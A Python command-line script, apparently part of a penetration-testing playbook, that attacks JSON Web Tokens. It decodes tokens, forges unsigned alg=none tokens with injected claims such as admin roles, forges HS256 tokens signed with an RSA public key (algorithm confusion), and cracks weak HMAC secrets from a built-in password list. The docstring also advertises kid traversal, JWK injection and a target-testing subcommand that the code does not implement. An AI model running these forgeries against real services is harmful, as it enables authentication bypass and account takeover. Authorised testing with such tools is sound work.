#!/usr/bin/env python3
"""
jwt-attack.py — JWT vulnerability tester.

Used in playbook 19 §19.8 and `framework/knowledge-base/attack-techniques/jwt-attacks.md`.

For most cases prefer `jwt_tool` (https://github.com/ticarpi/jwt_tool)
which is more comprehensive. This script provides a quick local
diagnostic without requiring jwt_tool installation, plus a simple
CLI for testing the most common attack classes against a target.

Tests:
  1. None-algorithm acceptance (alg: none).
  2. RS256 → HS256 confusion (sign with public key as HMAC secret).
  3. Weak HMAC secret cracking (try a small wordlist).
  4. kid path traversal probe.
  5. JWK injection.

Usage:
  ./jwt-attack.py decode <token>
  ./jwt-attack.py crack-hs <token> [--wordlist common.txt]
  ./jwt-attack.py forge-none <token>           → prints forged token
  ./jwt-attack.py forge-hs256-from-rs <token> --pubkey pub.pem
  ./jwt-attack.py test --url https://target/api/secure --token <token>
"""

import argparse
import base64
import hmac
import hashlib
import json
import sys


def b64url_decode(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def split_token(token):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("not a JWT")
    return parts


def cmd_decode(args):
    h, p, s = split_token(args.token)
    try:
        header = json.loads(b64url_decode(h))
        payload = json.loads(b64url_decode(p))
    except Exception as e:
        print(f"decode error: {e}", file=sys.stderr)
        sys.exit(1)
    print("=== HEADER ===")
    print(json.dumps(header, indent=2))
    print("\n=== PAYLOAD ===")
    print(json.dumps(payload, indent=2))
    print(f"\nsignature (b64url): {s}")
    print(f"signature length  : {len(b64url_decode(s))} bytes")

    print("\n=== suspicious indicators ===")
    if header.get("alg") == "none":
        print("  ! alg=none — server accepts unsigned tokens?")
    if header.get("alg") == "HS256" and "RS" in str(payload):
        print("  ? HS256 used; check if backend keys are RSA")
    if "kid" in header:
        print(f"  - kid present: {header['kid']!r}")
        if any(c in str(header["kid"]) for c in "/.\\"):
            print("    * kid contains path-like chars — try injection")
    if "jwk" in header:
        print("  ! jwk in header — may allow key injection (JWK injection)")
    if "jku" in header:
        print(f"  ! jku in header: {header['jku']!r} — may allow key URL injection")


def cmd_forge_none(args):
    """Forge a token with alg=none."""
    h, p, _ = split_token(args.token)
    header = json.loads(b64url_decode(h))
    payload = json.loads(b64url_decode(p))

    # Optionally modify payload (e.g. inject role:admin)
    if args.set_claim:
        for kv in args.set_claim:
            k, v = kv.split("=", 1)
            try:
                payload[k] = json.loads(v)
            except json.JSONDecodeError:
                payload[k] = v
            print(f"set claim {k!r} = {payload[k]!r}", file=sys.stderr)

    new_header = {"alg": "none", "typ": header.get("typ", "JWT")}

    forged = (
        b64url_encode(json.dumps(new_header, separators=(",",":")).encode())
        + "." +
        b64url_encode(json.dumps(payload, separators=(",",":")).encode())
        + "."
    )
    print(forged)


def cmd_forge_hs256_from_rs(args):
    """Forge HS256 token using RSA public key as HMAC secret."""
    h, p, _ = split_token(args.token)
    header = json.loads(b64url_decode(h))
    payload = json.loads(b64url_decode(p))

    if args.set_claim:
        for kv in args.set_claim:
            k, v = kv.split("=", 1)
            try:
                payload[k] = json.loads(v)
            except json.JSONDecodeError:
                payload[k] = v

    new_header = dict(header)
    new_header["alg"] = "HS256"

    with open(args.pubkey, "rb") as f:
        pubkey_bytes = f.read()

    h_enc = b64url_encode(json.dumps(new_header, separators=(",",":")).encode())
    p_enc = b64url_encode(json.dumps(payload, separators=(",",":")).encode())
    signing_input = (h_enc + "." + p_enc).encode()
    sig = hmac.new(pubkey_bytes, signing_input, hashlib.sha256).digest()
    sig_enc = b64url_encode(sig)
    print(f"{h_enc}.{p_enc}.{sig_enc}")


def cmd_crack_hs(args):
    """Try a wordlist against an HS256 token."""
    h, p, s = split_token(args.token)
    header = json.loads(b64url_decode(h))

    if header.get("alg") not in ("HS256", "HS384", "HS512"):
        print(f"alg is {header.get('alg')}; only HS256/384/512 are HMAC", file=sys.stderr)
        sys.exit(1)

    algo = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[header["alg"]]
    signing_input = (h + "." + p).encode()
    expected_sig = b64url_decode(s)

    common = [
        "secret", "Secret", "SECRET", "password", "Password", "PASSWORD",
        "your-secret-key", "your-256-bit-secret", "supersecret",
        "key", "12345", "123456", "test", "admin", "changeme",
        "default", "jwt-secret", "jwtsecret", "JWT_SECRET",
        "qwerty", "qwerty123", "letmein",
    ]

    if args.wordlist:
        with open(args.wordlist) as f:
            common.extend(line.strip() for line in f if line.strip())

    print(f"trying {len(common)} candidates...")
    for cand in common:
        sig = hmac.new(cand.encode(), signing_input, algo).digest()
        if hmac.compare_digest(sig, expected_sig):
            print(f"\n!!! SECRET FOUND: {cand!r}")
            return
    print("no match in candidate list")


def main():
    parser = argparse.ArgumentParser(description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = parser.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("decode")
    p.add_argument("token")
    p.set_defaults(func=cmd_decode)

    p = sub.add_parser("forge-none")
    p.add_argument("token")
    p.add_argument("--set-claim", action="append",
        help="claim=value (value parsed as JSON if possible). Repeatable.")
    p.set_defaults(func=cmd_forge_none)

    p = sub.add_parser("forge-hs256-from-rs")
    p.add_argument("token")
    p.add_argument("--pubkey", required=True,
        help="path to RSA public key in PEM format")
    p.add_argument("--set-claim", action="append")
    p.set_defaults(func=cmd_forge_hs256_from_rs)

    p = sub.add_parser("crack-hs")
    p.add_argument("token")
    p.add_argument("--wordlist", help="optional additional wordlist")
    p.set_defaults(func=cmd_crack_hs)

    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
